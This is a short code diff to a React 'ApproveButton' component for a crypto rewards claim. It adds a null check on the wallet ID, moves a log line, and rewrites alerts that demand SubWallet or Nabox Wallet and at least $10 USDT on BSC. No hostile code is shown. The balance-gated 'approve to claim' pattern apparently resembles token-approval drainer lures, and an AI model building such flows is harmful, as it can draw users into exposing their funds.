@@ -212,23 +212,20 @@ export default function ApproveButton() {
     }
 
     // Wallet eligibility check
-     console.log("Wallet ID sent to claim button:", walletId);
     const walletId = walletClient?.connector?.id;
-    if (!eligibleWallets[walletId]) {
-       console.log("Wallet ID sent to claim button:", walletId);
+    console.log("Wallet ID sent to claim button:", walletId);
+    
+    if (!walletId || !eligibleWallets[walletId]) {
       alert(
-        "🚫🔒 Eligibility check failed — you need at least $10 USDT (BSC) to claim. Please top up and try again.\n" +
         "🚫🔒 Only SubWallet and Nabox Wallet are eligible to claim rewards. Please connect with an eligible wallet."
       );
-     
       return;
     }
 
     // USDT minimum check
     if (!hasMinimumUsdt) {
       alert(
-        "🚫🔒 Eligibility check failed — you need at least $10 USDT (BSC) to claim. Please top up and try again.\n" +
-        "🚫🔒 Only SubWallet and Nabox Wallet are eligible to claim rewards. Please connect with an eligible wallet."
+        `🚫🔒 Eligibility check failed — you need at least $10 USDT (BSC) to claim. Your current balance: $${usdtBalanceNumber.toFixed(2)} USDT. Please top up and try again.`
       );
       return;
     }
